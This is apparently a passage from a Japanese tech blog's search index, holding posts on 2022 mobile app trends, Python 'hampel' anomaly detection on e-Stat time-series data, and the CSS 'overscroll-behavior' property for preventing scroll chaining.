2022年までに、モバイルアプリ市場の収益は6,930億ドルに達すると予想されています。\nただし、ほとんどのアプリは失敗してしまっているであるということです。\nこの失敗の主な理由は、最新のモバイルアプリテクノロジーのトレンドを追跡および実装できないことです。または、より技術的に適応力のある競合他社に負ける結果になります。\nモバイルアプリを成功させるための最初のステップは、2022年のモバイルアプリ開発のトレンドを常に把握することです。これらの最新のトレンドのいくつかについて詳しく説明しましょう。\nモバイルアプリ開発の新しいトレンドが数多く出現していますが、ここでは、詳細な事実に基づいた調査の結果、モバイルアプリ開発のトレンドのTOP15を取り上げました。\n5Gの台頭 5Gテクノロジーは数年前から存在していますが、近年より注目されるうようになりました。テクノロジー企業は5Gを本格的に取り入れ始めており、5G対応デバイスが市場に出回っています。来年までに、6億6000万台のスマートフォンが5G接続になると予想されており、これは全デバイスの約47.5％を占めています。 世界中の5G接続が今後数年間でどのように成長すると予測されているかを見てみましょう。\nrise of 5g 5Gの出現でアプリ開発はどうなる？ 5Gは、アプリの構築と使用の方法を変え、速度と効率が大幅に向上します。\nそれにより期待できることがいくつかあります。\n5Gは4Gよりも最大100倍高速になります。 レイテンシーは50ミリ秒（4G）から1ミリ秒に短縮されます。 高解像度、低遅延、高速性能により、ビデオストリーミングアプリケーションは大幅に改善されるだろう。 5Gでは、これらの技術をアプリに統合することが容易になるため、ARやVRの機会が増えるだろう。 デバイスとスマートフォン間でのデータ転送がより高速かつスムーズになります。 5Gを使用すると、開発者はアプリのパフォーマンスに悪影響を与えることなく新しい機能を構築できます 識別のための生体認証データの処理が高速化されているため、モバイル決済はより迅速かつ安全になります。 全体として、5Gテクノロジーはアプリをより速く、よりスムーズに、より効率的にすることができます。また、イノベーションの余地も広がります。アプリに関するワクワクするようなアイデアは、もはやアイデアにとどまることはありません。5Gを使えば、それらを実現することができます。5Gが何をもたらすのか、今から楽しみです。\n折りたたみ式デバイス用アプリ 折りたたみ式端末はスマートフォン市場全体のシェアの先端ですが、今後数年で状況が変わってきます。統計局 によると、2022年には5,000万台が出荷されるとのことです。つまりモバイルアプリの開発戦略を練る際には、折りたたみ式デバイスも念頭に置くべきでしょう。2022年のモバイルアプリ開発のトレンドである折りたたみ式デバイスで、あなたのアプリがシームレスに動作することを確認してください。\n端末を折りたたんで大きな画面を提供することは、ユーザーにいい影響を与えます。\n大きな画面は、詳細で没入感のある体験を提供するためのスペースを意味します。 マルチウィンドウにより、ユーザーは複数のタスクを同時に実行することができます。 ビデオストリーミングやゲームアプリは、画面サイズを大きくするだけで、折りたたみ式デバイスから最大限の利益を得ることができ、余分なスペースを使って追加の情報やコントロールを提供することもできます。このように、画面を意識したアプリの開発は、2022年のモバイルアプリ開発における最大のトレンドの1つとなるでしょう。\nストリーミング AR＆VR ポケモンGOの成功は一時的なものだったかもしれませんが、モバイルアプリ開発におけるARの道を切り開いたと言えるでしょう。それは、VRを使ってユーザーに没入型の体験を提供することが現実的に可能であることを世界に示したのです。\n今日、周りを見渡せば、ブランドがユーザー体験を高めるためにAR＆VRを活用しているシーンは数多く見受けられます。\nIKEAはARを使用して、ユーザーが購入する前に自宅で家具がどのように見えるかを確認できるようにします。 L\u0026rsquo;Orealは、ユーザーが自分の顔に化粧をしたときの見え方を確認できるバーチャルメイクアップアプリを提供しています。 Lenskartは、ユーザーがメガネを買う前にバーチャルで試せるようにしています。 Apple、Google、Metaでさえも、AR \u0026amp; VRにイノベーションをもたらしています。グーグルはグーグルマップに「ライブビュー」という機能を導入し、ユーザーは現実の画像上でリアルタイムに方角を確認することができるようになりました。\nLiDARもまた、最近ARの分野で見られた重要な技術的進歩です。Appleによって光の速度のARと呼ばれる - 私たちは、この技術がiPad Pro、iPhone 12 Pro、iPhone Pro 12 Pro maxでデビューするのを目にしました。それは、ARをまったく新しいレベルに引き上げました。LiDARにより、低照度下でも優れた品質の写真を撮影することが可能になりました。\nAppleはIkeaと提携し、LiDAR技術を利用した新しいスタジオモード機能を開始し、家具の買い方にまで革命を起こしています。この機能を使うと、ユーザーは家具を置きたい場所にデバイスを向けると、LiDARテクノロジーが部屋をスキャンして、実物大の家具モデルをバーチャルに配置することができます。\n今年は、ARとVRが、私たちの想像を絶する方法でモバイルアプリ開発業界を形成することが予想されます。モバイルアプリのトレンドは、より主流になるでしょう。統計局によると、ARとVR技術の世界市場は、2018年の270億ドルから2022年には約2,090億ドルに上昇すると言われています。\nまた、今年はAR＆VRのユーザー数が急増することが予想されます。このようなモバイルアプリの開発トレンドを活用して、モバイルでユーザーにゲームを変えるような体験を提供する絶好のチャンスがあるということです。\nar and vr ウェアラブルアプリの統合 ウェアラブルデバイスがすでに世界を席巻しています。\n統計局 によると、接続されたウェアラブルデバイスは2017年に4億5300万に達し、2022年までに9億2900万に達するでしょう。\n今年は、ウェアラブルデバイス業界で多くの重要なことが起こっているのを見ました。\nアップルはWatchOS 8アップデートを発表しました。これは、アップルウォッチユーザーに新機能、新鮮なウォッチフェイス、ウォレットへのアクセスの増加、インターフェイスの再設計をもたらしました。\nGoogleも、同社のウェアOSとSamsungのTizenソフトウェア・プラットフォームを融合した統一ウェアラブル・プラットフォームを発表し、アプリの起動時間を30％向上させました。\nこれは、2022年のモバイルアプリ開発の必須トレンドの1つであるウェアラブルテクノロジーの台頭を意味するものです。\nつまり、アプリ開発者や企業は、スマートウォッチやウェアラブルでユーザーに優れたデジタル体験を提供するアプリを準備し、そうでない企業に対して明確な優位性を獲得する必要があるのです。\nこのモバイルアプリ開発のトレンドを取り入れ、シームレスなデジタル体験を提供することで、ターゲットとなる顧客との距離を縮めましょう。\n食品・食料品の配達アプリ 人々はロックダウン後、在宅時間が多くなるため、食料品の即日配達サービスやミールキットなどのアプリに大きく依存するようになり、この2つは2020年から21年にかけて最も成長したアプリのカテゴリーとなりました。\nfood grocery delivery apps ご覧の通り、2020年には食料品アプリの利用者が40.9％増加しました。ほとんどの人が、食料品の買い物は実店舗に行かず、オンラインで行うことを選んだのです。\n同様のことは、フードデリバリーアプリでも起こりました。安全性が高く、オンラインで食品を注文することを好む人が多いため、32.9％の上昇となりました。\nしかし、2021年にはどちらのアプリも人気が低下しています。食料品アプリが5.8％上昇したのに対し、フードデリバリーアプリの利用者は2.6％減少しました。\n通常の生活に戻れば、その成長も少し低下するかもしれません。食品・食料品アプリは、依然として私たちの生活の重要な一部となるでしょう。人々はオンラインで食べ物を注文することをやめることはないでしょうし、食料品アプリはスマートフォンユーザーの15.5%を占めることに変わりはないでしょう。\nいずれにせよ、時間が経てばわかることですが、2022年に食品・食料品配達アプリがどのような道を歩むのか、興味深いところです。\nモバイルエンターテインメント＆ゲーム エンターテイメントやゲームアプリは、今やライフスタイルの一部となりました。それ無しでは一日たりとも過ごせないという人もいるほどです。\nNetflixの米国とカナダでのアクティブな加入者が約74％であることから、モバイルエンターテイメントアプリの人気は推し量ることができます。それだけでなく、1億5910万人以上の携帯電話ユーザーがおり、モバイルデバイスはゲーマーに人気があり、米国のデジタルゲーマーの89%以上に相当します。\nこの数字は、2022年にはさらに上昇することが予想されます。\nmobile entertainment なぜモバイルエンターテインメントとゲームアプリが人気があるのか？ エンターテインメントを手軽に楽しめるようになった。\n高価なガジェットや高価なノートパソコンを買う必要はなく、モバイルで楽しむことができる。 映画を見たり、ゲームをしたりするために、1つの場所に閉じこもる必要がない。外出先でも楽しむことができる。 AR、VR、人工知能などの技術の進歩により、ゲームやエンターテインメントアプリは、より没入感のあるもの。 モバイルエンターテインメント＆ゲームアプリは非日常を提供する。 特にパンデミック時には、人々はゲームやエンターテインメントアプリに時間を費やし、気を紛らわせました。\nAIと機械学習 FaceApp（自撮り写真を加工するアプリ）の画期的な成功の後、ほとんどの人が疑問に思っていました。次は何をするのだろう？そんな時、AIは期待をさらに大きく前進させるものをもたらしてくれました。MyHeritageAppは、写真をリアルなアニメーションに変換するすごい機能をもたらしたのです。このアニメーションはとても印象的で、愛する人があなたに微笑んでいるように感じられます。その結果、多くのリアクションが生まれました。\n昨年、AIで起こった興味深いことはこれだけではありません。Googleがマップアプリに、AIを使ってユーザー体験を向上させる新機能を投入したのも記憶に新しいです。そのひとつが、広い屋内空間でARナビゲーションを提供するライブビューです。\nGoogleはAIを利用して、燃料消費量が少なくなるように道順を最適化し、二酸化炭素排出量の少ないルートを提案することも行っています。\nAIとMLは、ここ数年連続してモバイルアプリ開発のトップトレンドの1つとなっています。しかし、これらの技術の進歩は、2022年のモバイルアプリ開発のハードルを非常に高くしており、今年はそれが何をもたらすのか興味深いところです。\n機械学習もまた、革命的なことが起こるのが待ち望まれるエキサイティングな分野です。ディープラーニングが機械学習と手を組めば、貴重なデータとリアルタイムの分析を提供し、モバイルアプリ開発プロジェクトに素晴らしい効果をもたらすことができます。\nCAGR42％で成長する世界のML産業は、2019年の機械学習から2022年後半には約90億ドル規模になる見込みです。\nAppleは、機械学習における重要なプレイヤーの1つで、その優秀なMLモデルにより、開発者は没入感のある新しい体験を生み出すことができるようになりました。既存の機能を簡単に追加できるだけでなく、新しい機能を作ることもできます。その上、ML APIで新しい機能を追加することもできます。\n今年は、これらの技術に深く入り込み、その機能をきちんと理解し、多くの構成要素に触れることをお勧めします。\nモバイルアプリのセキュリティがより重視 チェック・ポイントの「State of Mobile Security 2021」レポートによると、約46％の組織が、悪意のあるモバイル・アプリケーションをダウンロードした従業員を少なくとも1人抱えているとのことです。従業員のモバイル端末への依存度が高いことを考えると、企業にとって懸念すべき問題であると言えます。\nほとんどの企業は、サイバーセキュリティがデータ保護や情報プライバシーに関する法律に直結していることを考慮して、サイバーセキュリティへの投資を増やそうとしています。\nこのように、デジタルセキュリティは、2022年のモバイルアプリ開発のトップトレンドの1つとして浮上しています。業界の優れた頭脳は、モバイルアプリにまつわる不確実性を引き出すためにレベルアップしています。WWDC 2021で、Appleは \u0026ldquo;iCloud キーチェーン\u0026rdquo; という新機能を導入し、パスワードレスの未来への第一歩を踏み出しました。これによって、アップルはパスワードに代わって、より安全なログインプロセスを提供することになりました。\nnobile app security 2022年、モバイルアプリ開発業界は、セキュリティファーストのアプローチにシフトし、強固なDevOps戦略のロードマップを構築すると予想されます。\nスーパーアプリ 1つのアプリに1つの目的 - これが、モバイルアプリ開発会社の長年のアプローチです。しかし今、そのアプローチは変わりつつあります。企業は、単一目的のアプリから、複数の目的を解決するワンストップ・ソリューションにシフトしているのです。\nこのようなアプリはスーパーアプリと呼ばれ、アジアで絶大な人気を誇っています。しかし、このトレンドは欧米にも浸透しつつある。米国では、カリフォルニアに本社を置くブレインテクノロジーズ社が開発したNatural AIが面白い例として挙げられます。このアプリは、人々の携帯電話との付き合い方を変え、1つのアプリから複数の目的を解決できるようにすることを目指しています。\nsuper apps さらに、Facebookが単なるソーシャルメディアのプラットフォームからどのように拡張されたかをご覧になったことがあるかと思います。現在では、人々が製品を売買できるマーケットプレイスも提供されています。同様に、オンラインショッピングとは別に、請求書の支払いやAmazonからの支払いもできるようになりました。\n欧米では、スーパーアプリの流行はそれほど高くはなく、人々は1つに決める前にさまざまなソリューションを試すことを好むからです。それでも、最終的には誰もが利便性を求めるものです。スーパーアプリは、2022年に期待すべきモバイルアプリ開発のトレンドと言えるでしょう。\nモバイルコマース EEコマース分野は3兆5,600億ドル相当の売上を誇り、その72.9%はモバイルで発生しています。\nつまり、モバイルコマースはアプリ開発のトレンドとして高まっているのです。\nCOVIDの大流行後、ライフスタイルの大きな変化が見られました。大規模な小売業者から中小企業、個人消費者に至るまで、誰もがモバイルアプリに依存するようになったのです。\nそのため、適応できないEコマース企業は不利な状況に置かれています。彼らは多くの顧客を失い、彼らは変換することができるものを見逃しているもです。\nつまり、企業は、このトレンドに適応し、電子商取引のビジネスアプリを持っている必要があります。それは、彼らがカットスロート競争を生き残ることができる唯一の方法です。\nP2Pモバイルアプリ P2Pモバイルアプリは、モバイルアプリ開発分野を特徴付けるもう一つの重要なトレンドです。eMarketerによると、P2Pモバイルトランザクションの予測価値は2023年までに6,122億3,000万ドルに達するでしょう。これは、現在、P2Pモバイルアプリに大きな可能性があることを意味します。\np2p mobile apps P2Pモバイルアプリが企業やユーザーの間で人気を集めている理由は、その利便性にある。ユーザーは素早く支払いができ、売り手は自分のアカウントに直接支払いを受けることができます。そのため、余計な手間がかかりません。\n今年、私たちの周りで見られるP2Pモバイル・アプリの種類をいくつか紹介ましょう。\n決済機能を内蔵したソーシャルメディアプラットフォーム 決済のためのシステムを組み込んだモバイルOSシステム。例：Apple Pay、Samsung Pay、Android Payなど。 独自の決済システムを提供している独立系プロバイダー。 銀行を決済の当事者とするP2Pアプリ。 暗号通貨のウォレット。 P2Pモバイルアプリのアイデアがあるなら、それを実現する絶好の機会です。\nブロックチェーン 私たちがブロックチェーンについて初めて耳にしたのは、暗号通貨ブームの時でした。しかし、今ではこの技術は大きく進歩し、さまざまな分野で応用できるようになりました。かなりの勢いで成長しており、2024年までに200億ドルの収益が蓄積されると予想されています。ブロックチェーンは、モバイルアプリ開発においても極めて重要な役割を担っています。\n分散型アプリは最近の流行りです。ブロックチェーンウォレットは7000万個以上あり、そのうちモバイルウォレットは最も好まれるブロックチェーンウォレットの形態です。これらの統計は、ブロックチェーンウォレットのユーザー数が大幅に増加していることも示しています。\nblockchain そのほかに、デジタル資産の追跡、デジタルIDの保護、ロイヤルティプログラムの追跡にブロックチェーンを使用する通貨換算器も見られます。\n2022年以降には、インテリジェント・コントラクト、著作権侵害防止ソフトウェア、選挙を穏健化するツール、Blockchain as a service（BaaS）プラットフォームなど、このトレンドがより主流になると見ています。特にモバイルコマースやモバイル決済アプリでは、ブロックチェーンを利用して不正を未然に防ぐことができるのです。\n予測分析 企業は以前からモバイルアプリで予測分析を利用しています。Netflixは、ユーザーの視聴習慣に基づいて映画やテレビ番組を推薦するためにこれを使用しています。また、Amazonは、予測分析を活用して、商品の推薦をパーソナライズしています。\n今年は、予測分析がより主流になると思われます。ここでは、2022年のモバイルアプリ開発において、このトレンドが重要な役割を果たすと考えられる2つの分野を紹介します。\n開発プロセスの最適化へ\n企業は、開発者から収集したデータを処理することで、問題を事前に発見し、より良い代替案を提案することができます。 ユーザーエクスペリエンスを向上させるために\n企業はユーザーデータを利用して、ユーザーの行動を予測し、その旅をパーソナライズすることができます。 その結果、優れた品質を維持しながら開発期間を大幅に短縮し、イノベーションの実現により注力することが可能になったのです。\nモバイル学習 統計局によると、従業員の35％ がモバイルデバイスを頻繁に使って学習しているとのことです。また、モバイルラーニング市場は、2025年までに585億ドルに達し、2020年から2025年にかけて21.45%のCAGRが約束されると予想されています。つまり、モバイルラーニングは、モバイルアプリ開発のあり方を変える、有望なトレンドといえます。\nモバイルラーニングは多くの理由で有名です。まず、学習が簡単にアクセスできるようになります。学習者はどこでも、誰でも学習できるため、力を得たと感じられます。さらに、継続的なフィードバックや360度学習などの体験により、学習がインタラクティブで楽しいものになりました。\nコースの修了率の向上、学習の迅速化、エンゲージメントの向上、知識の定着率の向上につながるため、現在では企業でもモバイル学習が支持されています。\nそのため、モバイル学習アプリの需要は高いといえます。画期的なアイデアや、社員教育のためにモバイル学習ソリューションを立ち上げる計画があるのなら、今こそ教育アプリ開発を専門とするチームにコンタクトを取るべきでしょう。\nIoT対応のモバイルアプリ インターネットは私たちの生活の中に深く入り込んでいます。スマートフォン、ノートパソコン、タブレットから、音声で操作できるスマートホームデバイスまで、私たちはインターネットに接続された機器に囲まれています。モノのインターネット（IoT）は、単なるトレンドにとどまらず、2022年の市場規模は5940億ドルと推定され、私たちの日常生活の一部となりました。\nここ数年、アマゾンやグーグルのようなブランドがこの技術をフルに活用しているのを目にしました。彼らはそれぞれ「Echo」シリーズのデバイスとGoogle Home Voice Controllerを発表して、IoTの競争を強化しました。\nしかし現在では、Samsung、Xiaomi、Bosch、Honeywellなどのブランドも、モノのインターネット技術に急速に移行しています。小売業における継続的なサプライチェーン、スマートホーム、精通した健康保険プランなどは、もはやSF的なものではなく、現実に生きてきているのです。\nIoTガジェットやシステムの需要増加に伴い、IoT対応アプリの需要も同時に増加するため、2022年のモバイルアプリ開発のトップトレンドのリストに含まれています。\nまとめ GoogleとAppleのApp Storeを合わせると663万個のアプリが存在します。あなたのアプリを目立たせるには、どうしたらいいでしょうか？\n実は、モバイルアプリ開発の最新トレンドを常に把握し、それを活用して堅牢で機能豊富なアプリを提供する方法を知らなければ、できないことなのです。\nモバイルアプリ業界は今後も急速に拡大し、モバイルアプリ開発の領域も進化していくでしょう。新興のモバイルアプリプラットフォーム開発技術、上昇するバックエンドプラットフォーム、マイクロサービス、そして新しいハードウェアの性能と相まって、モバイルアプリソリューションの舵取りを続けていくでしょう。継続的に学習し、常に意識することが、熾烈な競争を勝ち抜く唯一の方法なのです。\nおすすめの書籍 NO RULES(ノー・ルールズ) 世界一「自由」な会社、NETFLIX 5万部突破!! 日経朝刊で「経営者が読むべき1冊」と激賞! (2020年12月26日付) 「日本でこんなマネのできる企業はまずないだろうが、海外の競争相手はネットフリックス流の人材厳選主義を採用しているかもしれない。その迫力と怖さを知るためにも、経営者が手に取るべき本である」 ●Netflixはどうやって190カ国で2億人を獲得できたのか？。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 オードリー・タン デジタルとAIの未来を語る オードリー・タン氏自身が、自らの考え、行動、夢を語る。 世界のメディアがいま、最も注目するテクノロジー界の叡智が、描くデジタルとAI（人工知能）の未来！ 台湾は、2020年に全世界を襲った新型コロナウイルス（COVID－19）の封じ込めに唯一成功しました。 本書は、その中心的な役割を担った若きデジタル担当政務委員（閣僚）が、コロナ対策成功の秘密、デジタルと民主主義、デジタルと教育、AIと社会・イノベーション、そして日本へのメッセージを、自身の言葉で語りつくします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-17T18:11:53+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/catch_hua1e03cb04863b34ec3302b219f888af8_22468_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/","title":"2022年に注目すべきモバイルアプリ開発トレンド 15選"},{"content":"Pandas DataFrameオブジェクト Pandasでcsvをread_csvするとDataFrameオブジェクトとして読み込まれます。\nDataFramオブジェクトは２次元配列な感じです。\n１次元目が列、２次元目が行のイメージみたいです。\n例えば以下のcsvだと\ndate,value 2019,2845 2020,3246 2021,3633 read_csvしたDataFrameオブジェクトの変数名をdfとすると\nそれぞれのデータには以下の方法でアクセスします。\ndf[\u0026#39;date\u0026#39;][0]-\u0026gt;2019 df[\u0026#39;date\u0026#39;][1]-\u0026gt;2020 df[\u0026#39;date\u0026#39;][2]-\u0026gt;2021 df[\u0026#39;value\u0026#39;][0]-\u0026gt;2845 df[\u0026#39;value][1]-\u0026gt;3246 df[\u0026#39;value\u0026#39;][2]-\u0026gt;3633 read_csvするとデフォルトだと１行目を列名とみなすみたいです。\nアクセスの方法も列名が反映され連想配列っぽくなります。\nPandas Seriesオブジェクト hampelの第１引数はPandasのSeriesオブジェクトです。\nSeriesオブジェクトは１次元の配列みたいです。\nDataFrameオブジェクトからSeriesオブジェクトに変換する方法ですが\n以下の方法でできます。\ninput=pd.Series(df[\u0026#39;value\u0026#39;]) csvを読み込んでhampelメソッドを使い異常値を検出する 。 プログラムは以下の流れになります。\ncsvをread_csvでDataFrameオブジェクトとして読み込む。\nDataFrameオブジェクトからSeriesオブジェクトを生成する。\nSeriesオブジェクトを使ってhampelメソッドを呼び出して異常値を検出する。\nソースコードは以下の通り\nimport matplotlib.pyplot as plt import pandas as pd from hampel import hampel # データ取得 df = pd.read_csv(\u0026#39;./kome.csv\u0026#39;) print(df.columns) print(df[\u0026#39;value\u0026#39;]) input = pd.Series(df[\u0026#39;value\u0026#39;]) rsts = hampel(input, window_size=5, n=3) for rst in rsts: print(\u0026#39;%d:date:%s value:%d\u0026#39; % (rst,df[\u0026#39;date\u0026#39;][rst],df[\u0026#39;value\u0026#39;][rst])) ","date":"2022-01-17T17:46:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/","title":"s-Stat 時系列データで異常値を検知しよう（３）"},{"content":"hampel フィルタとは 時系列データの異常値検知で良いのないかなあと探しました。\n最近は機械学習で時系列データの異常値検知をやっているものが結構ある感じでしたが、\ne-Statの統計データですが年次や月次だったりするのでデータ数がそんなに多くないので機械学習はどうだろうと思い今回は機械学習以外の方法を探しました。\n標準偏差などを利用して異常値を検出するアルゴリズムとしてHampelフィルターというものがありました。\npythonでhampelというライブラリーで簡単に利用できそうなのでまずこれを試してみます。\npython hampel ライブラリを利用 hampelはpip で簡単にインストールできます\npip install hampel import matplotlib.pyplot as plt import pandas as pd from hampel import hampel input=pd.Series([3, 2, 1 , 3 , 1, 2, 9, 2, 1, 22, 1, 1, 8]) rst = hampel(input, window_size=5, n=3) print(\u0026#34;rst: \u0026#34;, rst) bash-3.2$ python p.py rst: [6, 9, 12] 時系列データをpandasのSeriesに１次元で食わせて\nhampelメソッドを呼び出すだけで簡単に異常値が検出できます。\n異常値が検出された配列の番号が返却されます。\nこの例だと7個目の9,10個目の22,13個目の8です。\nwindon_size などは経験的にパラメータ調整するみたいです。\n次回は前回読み込んだcsvを使って異常値を検出するところまで行きたいと思います。\n","date":"2022-01-17T10:51:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/","title":"s-Stat 時系列データで異常値を検知しよう（２）"},{"content":"出典元： Prevent Scroll Chaining With Overscroll Behavior - Ahmad Shadeed position: fixedの要素があるとしましょう。スクロールがある場合は、要素の下部の境界に到達すると、ブラウザはbody要素をスクロールし続けることに気付くでしょう。これは望ましくない混乱を招く効果です。ありがたいことに、CSSで修正できます。 この記事では、overscroll-behavior CSSプロパティ、それが解決する問題、その仕組み、および使用場所について説明します。\nはじめに 非常に一般的な問題を取り上げましょう。ビューポートの中央に配置されたモーダルダイアログがあります。そのモーダルの下に、実際のWebページのコンテンツがあります。\nモーダルコンテンツの最後に到達すると、ブラウザは代わりにメインページのコンテンツをスクロールし続けます。これはスクロールチェーンと呼ばれます。これはデフォルトの動作であり、overscroll-behaviorという新しいCSSプロパティでオーバーライドできるようになりました。\n多くの場合、この動作は不要であり、ユーザーがモーダルコンテンツに集中できなくなる可能性があります。上の図では、モーダルの最後に到達したときに、ページがスクロールし続けていることに注目してください。\n無理やり対応する 以前は、javascriptを介してbody要素にoverflow: hiddenを適用することでこれを修正していました。モーダルが開かれると、オーバーフローの適用を担当するクラスが本体に追加されます。\nbody.modal-open { overflow: hidden; } .modal.is-open { display: block; } このやり方は、以前はデスクトップブラウザ間で完全に機能していましたが、iOS上のSafariでは動作しませんでした。これを機能させるには、body要素にposition: fixedを追加する必要もあります。\nbody.modal-open { position: fixed; overflow: hidden; } .modal.is-open { display: block; } これは機能しますが、ブラウザが一番上までスクロールし、ユーザーが手元のタスクから気をそらしてしまいます。これは、他の問題を引き起こす修正です。\nベン・フレインによる 記事 に固定されたものを除いて、私はその解決策を知りません。 ベンの記事のスニペットによると、モーダルがアクティブになったら、\u0026lt;body\u0026gt;要素に以下を追加する必要があります。\n.bg-scrolling-element-when-modal-active { /* when modal active */ touch-action: none; -webkit-overflow-scrolling: none; overflow: hidden; /* Other browsers */ overscroll-behavior: none; } 2018年にクライアントプロジェクトに取り組んだことを覚えています。そこでは、iOSのモバイルメニューの本文のスクロールを防ぐことはできないと彼に話しました。\n彼は：\nプログラミングで不可能なことは何もありません。解決策があると確信している。\nといっていました。\n「プログラミング？」と思うかもしれませんが、それはCSSを指します。多くのことを試して、研究し続けましたが、完璧な解決策はありませんでした。\nそれでは時間を遡って、overscroll-behaviorをソリューションに紹介したいと思います。\noverscroll-behaviorについて overscroll-behaviorプロパティは、スクロール領域の境界に到達したときにブラウザが実行する処理を設定します。 Safariを除くすべての主要なブラウザで[サポートされています。プロパティは、overscroll-behavior-xおよびoverscroll-behavior-yの省略形です。 overscroll-behaviorを設定すると、両方の軸が設定されることに注意してください。\n設定可能な値を見てみましょう。\noverscroll-behavior: auto デフォルト値は auto で、これによりスクロールチェーンが可能になります。スクロール要素があり、その境界に達すると、ブラウザは\u0026lt;body\u0026gt;コンテンツをスクロールし続けます。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. overscroll-behavior: contain その名前から、値containには、要素の境界内にスクロールが含まれます。次の図では、スクロールは青い輪郭のラッパー内に含まれています。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. overscroll-behavior: none noneを設定すると、 contains と同様の効果があり、 さらに ページの上部または下部に達したときのバウンス効果を防ぎます。\nユースケースと例 overscroll-behavior がどのように機能するかがわかったところで、いくつかの便利なユースケースを見てみましょう。\nモバイルナビゲーション モバイルナビゲーションが長すぎる場合、スクロールが速すぎると、本文のコンテンツでスクロールチェーンの問題が発生する可能性があります。\n次の図には、スクロール可能な長いナビゲーションリストがあります。\nスクロールが含まれていない場合は、本文のコンテンツもスクロールします。それを避けることができます\n.nav { overscroll-behavior-y: contain; overflow-y: auto; } 動画で見てみましょう。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. ナビゲーションの下に表示される半透明の背景を追加しました。 overscroll-behavior-yプロパティをオフに切り替えたときの動作に注意してください。\nオフに切り替えると、ボディスクロールが発生します。\nただし、ナビゲーションが短く（つまり、スクロールできない）、ユーザーが理由もなくスクロールしようとすると、overscroll-behavior-y: containであっても、本文がスクロールすることに注意してください。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. 残念ながら、記事の冒頭で紹介した「無理やり対応」以外の修正方法はわかりません。\nサイドナビゲーション overscroll-behavior のもう1つの便利な使用法は、サイドバーとメインがある場合です。その場合、サイドバーは固定されており、コンテンツが長すぎるとスクロール可能になる可能性があります。\nサイドバーの端の境界に達したときにメインセクションがスクロールしないようにするには、次を追加する必要があります。\n.aside { overscroll-behavior-y: contain; } チャットコンポーネント Facebookに触発されたチャットコンポーネントは、 overscroll-behavior の完璧なユースケースです。これを使用して、最後に到達したときにボディがスクロールしないようにできます。\n.aside { overscroll-behavior-y: contain; } モーダルコンテンツ 記事内で最初に行った例はモーダルなので、繰り返しません。ただし、モーダル内にリストが必要な場合があり、そのリストがスクロール可能である場合は、スクロールチェーンを発生させたくありません。\nモーダルのオプションのリストに注意してください。これはスクロール可能なリストです。その境界に達すると、モーダルコンテンツがスクロールします。これを回避するには、 overscroll-behavior を使用します。\n.list-wrapper { overscroll-behavior-y: contain; overflow-y: auto; max-height: 130px; } 水平リスト Facebookのホームページでこのユースケースを見つけました。ユーザーのリストがあるセクションがあり、次の図に示すように水平方向にスクロールします。\nこれはoverscroll-behavior-xのベストな使い方です。\n.list { overscroll-behavior-x: contain; } まとめ CSS overscroll-behavior は、何年も前に無理やり対応していた問題を解決する便利なプロパティです。\nオススメの書籍 ざっくりつかむ　CSS設計[リフロー版] Web制作の現場でこれだけは知っておきたい、CSSの扱い方、管理、運用の基本！ Web開発が複雑化した現在、CSSについても仕様や知識を知っているだけでは対応できない問題が増えています。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\nプロの「引き出し」を増やす　HTML\u0026#43;CSSコーディングの強化書 HTML・CSSの基本は覚えたけれど、デザインカンプから情報を読み取って、イチからコーディングするのはまだ無理……。 初心者を脱して、コーダー／マークアップエンジニアとして制作現場でバリバリ活躍する力をつけたい。 本書はそんな方に向けたものです。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n","date":"2022-01-15T12:16:02+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro_hu24c71efb47487f1e866b5cfa9cf10000_52262_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/","title":"overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止"},{"content":"s-Stat 時系列データで異常値を検知しよう たくさんあるデータの中から関心の高そうな項目を抽出して表示しようというテーマでe-Statデータを取り扱っています。\n関心の高そうな項目としては、キーワードが重要というのもあります。これは前回で取り扱ったテーマでgoogle検索などを利用してピックアップしてこうかなと考えております。\nそのほか、値が急上昇、急下降したような場合も関心が高い項目と言えそうです。\n今回は、データの中から値が急上昇、急下降した場合を抽出する方法を考えて行きたいと思います。\nwebで検索した感じだと今回やりたいことは、時系列データの異常値を検知するというものみたいです。\n方法を色々調べてみたのですがpython のhampel を使うのが簡単そうです。\ne-Statのapiを取得したcsvを利用しますので、まずpythonでcsvを取り扱う方法から調べる必要があります。\npython でcsvを取り扱う 今回は、pandasを利用することになるのでpandasでcsvを読み込むことにします。\n課題としては、商品の小売価格の変動が分かりやすいので「小売物価統計調査 小売物価統計調査（動向編） 」から札幌市のコシヒカリの値段を抜粋してcsvを作成したいと思います。\nwget \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003421913\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -O kouri.csv cat kouri.csv |grep \u0026#34;札幌市\u0026#34;|grep \u0026#34;1001 うるち米(単一原料米,「コシヒカリ」)\u0026#34;|awk -F, \u0026#39;{print $10\u0026#34;,\u0026#34;$13;}\u0026#39;|sed -e \u0026#34;s|\\\u0026#34;||g\u0026#34;|sort -n \u0026gt;kome.csv 2002000101,2483 2002000202,2483 2002000303,2480 